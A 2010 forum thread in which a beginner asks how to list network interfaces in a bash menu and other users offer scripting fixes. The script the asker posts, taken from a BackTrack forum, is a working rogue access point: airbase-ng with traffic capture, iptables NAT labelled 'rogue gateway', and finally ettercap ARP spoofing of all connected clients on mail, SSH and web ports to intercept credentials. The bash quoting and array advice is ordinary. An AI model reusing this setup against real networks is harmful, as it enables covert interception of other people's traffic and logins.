---
title: "bash newline problem...."
date: 2010-03-01
forum: General Help
---

### Post by junke1990 on 2010-03-01
Hey guys, I've read a lot about it, but I cant find anything I can understand, (bash noobie).

I'm trying to get a list of interface's beneath each other so the user can pick from them.

I've tried a lot but nothing works... (it works just fine on the command-line! :( ) 

```
intlist=`ifconfig |cut -d' ' -f1 |grep . |tr ' ' '\n'`
echo $intlist
ELM=${#intlist[@]}
```

**OR**

since echo -e $list |tr ' ' '\n' worked within the script I tried to put it to a var that way... 
```
list=`ifconfig |cut -d' ' -f1 |grep .`
intlist=`echo -e $list |tr ' ' '\n'`
echo -e $intlist
ELM=${#intlist[@]}
```


code following this (why I need it):
```
# select inet adapter
echo "Select your inet conn. [#]"
for ((i=0;i<$ELM;i++)); do
  echo $i. ${intlist[${i}]}
done
read item
intI=${intlist[${item}]}
```

---

### Post by d3v1150m471c on 2010-03-01
Can you tell use exactly what you're writing the script for or what it's supposed to accomplish?

---

### Post by junke1990 on 2010-03-01
I'm trying to create a universal script to bridge the 3G to wlan. I'm testing it first with just eth0 to wlan.

I've got the script from the BT forum, not really for the purpsose I want to use it for.

I'm not far enough to set the IP settings automaticly.

```
#!/bin/bash
# SoftAP for wireless-testing
# Modded by Junke1990
#
# Hardware: Eee PC 1000h 
# NICs
#  eth0 	(LAN)  
#  ra0 		(WLAN)  
#  3G adapter adapter

modprobe tun
sleep 1

# get interface list
intlist=`ifconfig |cut -d' ' -f1 |grep .`
ELM=${#intlist[@]}

# select inet adapter
echo "Select your inet conn. [#]"
for ((i=0;i<$ELM;i++)); do
  echo $i. ${intlist[${i}]}
done
read item
intI=${intlist[${item}]}
intI_IP=`ifconfig $intI | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}'`

# select SoftAP adapter
echo "Select your SoftAP adapter. [#]"
for ((i=0;i<$ELM;i++)); do
  echo $i. ${intlist[${i}]}
done
read item
intAP=${intlist[${item}]}

# MAC address
intAP_MAC=`ifconfig $intAP |grep 'HWaddr ' | cut -d' ' -f 12`

# enter wireless essid name
echo "Enter the desired name for wireless network."
read essid

# prepare interface / softap
wlanconfig $intAP destroy
wlanconfig $intAP create wlanmode mon wlandev wifi0
xterm -e airbase-ng -c 6 -e $essid -a $intAP_MAC -W 0 $intAP &
sleep 1
ifconfig $intAP up
ifconfig $intAP 192.168.3.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

# monitor
xterm -e airodump-ng -c 6 --bssid $intAP_MAC $intAP &
xterm -e tshark -i 3 "not broadcast and not multicast" & # at0 = 3

# create custom dhcpd.conf for WLAN
cat > dhcpd.conf << EOF
ddns-update-style ad-hoc;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.3.0 netmask 255.255.255.0 {
option subnet-mask 255.255.255.0;
option broadcast-address 192.168.3.255;
option routers 192.168.3.1;
option domain-name-servers 192.168.3.1;
range 192.168.3.10 192.168.3.100;
}
EOF

# start dhcp server for subnet
dhcpd -cf dhcpd.conf at0

# iptables cleanup
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

# iptables
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.1.1 # DNS
iptables --table nat --append POSTROUTING --out-interface $intI -j MASQUERADE # gateway to ext. router
iptables --append FORWARD --in-interface at0 -j ACCEPT # rogue gateway
iptables -t nat -A PREROUTING -s 192.168.3.0/24 -d 192.168.1.0/24 -j DROP # protect LAN from WLAN
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

### Post by cjhabs on 2010-03-01
How about:
for interface in `ifconfig |cut -d' ' -f1 |grep .`; do echo $interface; done

Substitute your commands of choice for the echo

---

### Post by d3v1150m471c on 2010-03-01
Alright, I'm not sure how to bridge the connection but what I can tell you how to do is prompt for the interface.

```

echo "           Choose one of the following     "
echo
echo "    wlan0               eth0            wmaster0       "
echo
read -p '[Enter] an interface: ' inet
#
# Now just use the "inet" variable set by read to bridge the connection the way you understand it.
#

```

---

### Post by DaithiF on 2010-03-01
or if you want to display the menu of interfaces with numbers and have the user choose by number then you can do:
 
```
 
ifconfig |cut -d' ' -f1 |grep . | while read interface
do
i=((i+1))
intlist[i]=$interface
echo $i\) ${intlist[i]}
done

```

---

### Post by geirha on 2010-03-01
For your initial query; use quotes! Rule of thumb, ALWAYS quote expansions.
"$1" "$foo" "${path##*/}" "$(some command)". See [http://bash-hackers.org/wiki/doku.php/syntax/words](http://bash-hackers.org/wiki/doku.php/syntax/words)

Try this:
```

#!/bin/bash
i=0 iflist=() maclist=()
while read -r if mac; do 
  iflist[i]=$if
  maclist[i]=$mac
  ((i++))
done < <(ifconfig | awk '/^[^ ]/ && $1 != "lo" {print $1,$5}')

for i in "${!iflist[@]}"; do
  echo "$i: interface ${iflist[i]}, mac: ${maclist[i]}"
done

```

And I urge you to read [http://mywiki.wooledge.org/BashGuide](http://mywiki.wooledge.org/BashGuide)

---

### Post by junke1990 on 2010-03-01
owke I'm just getting started with bash so it's a bit hard to follow for me.

Geirha's solution seems most promising so it should be something like:

```
i=0 iflist=() maclist=()
while read -r if mac; do 
  iflist[i]=$if
  maclist[i]=$mac
  ((i++))
done < <(ifconfig | awk '/^[^ ]/ && $1 != "lo" {print $1,$5}')

echo "Select your inet conn. [#]"
for i in "${!iflist[@]}"; do
  echo "$i: interface ${iflist[i]}, mac: ${maclist[i]}"
done
read j
intI=${iflist[j]}

```

---

### Post by junke1990 on 2010-03-01
well, I can't really get it to work on Ubuntu but it SHOULD work with backtrack (if I should believe the people on the BT forum).

I'm still to n00bish to write the code like gierha but it's a start! xP

```
#!/bin/bash
# SoftAP for wireless-testing
# Modded by Junke1990
#
# Hardware: Eee PC 1000h 
# NICs
#  eth0 	(LAN)  
#  ra0 		(WLAN)  
#  wlan1 	(USB WLAN)

modprobe tun
sleep 1

# get interface and mac list
i=0 iflist=() maclist=()
while read -r if mac; do 
  iflist[i]=$if
  maclist[i]=$mac
  ((i++))
done < <(ifconfig | awk '/^[^ ]/ && $1 != "lo" {print $1,$5}')

for i in "${!iflist[@]}"; do
  echo "$i: interface ${iflist[i]}, mac: ${maclist[i]}"
done
echo "Select your inet conn. [#]"
read j
intI=${iflist[j]}

intI_IP=`ifconfig $intI | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}'`

# select SoftAP adapter
for i in "${!iflist[@]}"; do
  echo "$i: interface ${iflist[i]}, mac: ${maclist[i]}"
done
echo "Select your SoftAP adapter. [#]"
read j
intAP=${iflist[j]}

# MAC address
intAP_MAC=${maclist[j]}
#intAP_MAC=`ifconfig $intAP |grep 'HWaddr ' | cut -d' ' -f 12`

# enter wireless essid name
echo -e "Enter the desired name for wireless network:"
read ssid

# prepare interface / softap
#wlanconfig $intAP destroy
#wlanconfig $intAP create wlanmode mon wlandev wifi0
xterm -e airbase-ng -c 6 -e $ssid -a $intAP_MAC $intAP &
sleep 1
ifconfig $intAP up
ifconfig $intAP 192.168.3.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

# monitor
xterm -e airodump-ng -c 6 --bssid $intAP_MAC $intAP &
xterm -e tshark -i 3 "not broadcast and not multicast" & # at0 = 3

# create custom dhcpd.conf for WLAN
cat > dhcpd.conf << EOF
ddns-update-style ad-hoc;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.3.0 netmask 255.255.255.0 {
option subnet-mask 255.255.255.0;
option broadcast-address 192.168.3.255;
option routers 192.168.3.1;
option domain-name-servers 192.168.3.1;
range 192.168.3.10 192.168.3.100;
}
EOF

# start dhcp server for subnet
#dhcpd -cf dhcpd.conf at0
dhcpd3 -cf dhcpd.conf at0

# iptables cleanup
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

# iptables
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.1.1 # DNS
iptables --table nat --append POSTROUTING --out-interface $intI -j MASQUERADE # gateway to ext. router
iptables --append FORWARD --in-interface at0 -j ACCEPT # rogue gateway
iptables -t nat -A PREROUTING -s 192.168.3.0/24 -d 192.168.1.0/24 -j DROP # protect LAN from WLAN
echo 1 > /proc/sys/net/ipv4/ip_forward

# --- works so far but now the fun-stuff that causes my headache

# ettercap TCP Ports
# IMAP - 143/TCP 220/TCP (IMAP3) 993/TCP (IMAPS)
# POP3 - 110/TCP 995/TCP
# SMTP - 25/TCP 465/TCP
# SSL - 443/TCP
# HTTP - 80/TCP
# SSH - 22/TCP

xterm -e ettercap -Tq -i at0 -l ettercap -M arp:remote /192.168.3.1/ /192.168.3.10-100/22,25,80,110,143,220,443,465,993,995 &

```

---

